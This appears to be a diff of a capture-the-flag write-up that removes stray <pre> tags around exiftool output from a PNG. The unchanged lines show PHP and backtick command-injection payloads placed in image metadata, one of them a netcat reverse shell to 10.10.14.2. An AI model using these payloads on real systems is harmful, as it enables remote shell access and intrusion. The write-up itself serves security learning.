@@ -247,7 +247,7 @@ exiftool -Comment='<?php exec("ls") ?>'
 But our payload does not get interpreted:
 
 ```php
-<pre>File Type                       : PNG
+File Type                       : PNG
 File Type Extension             : png
 MIME Type                       : image/png
 Image Width                     : 36
@@ -260,7 +260,6 @@ Interlace                       : Noninterlaced
 Significant Bits                : 8 8 8
 Artist                          : `id`
 Comment                         : <!--?php system("nc 10.10.14.2 5454 -e /bin/bash"); ?-->
-</pre>
 ```
 
 Going for friendly payloads, we can inject HTML code but nothing further than that:
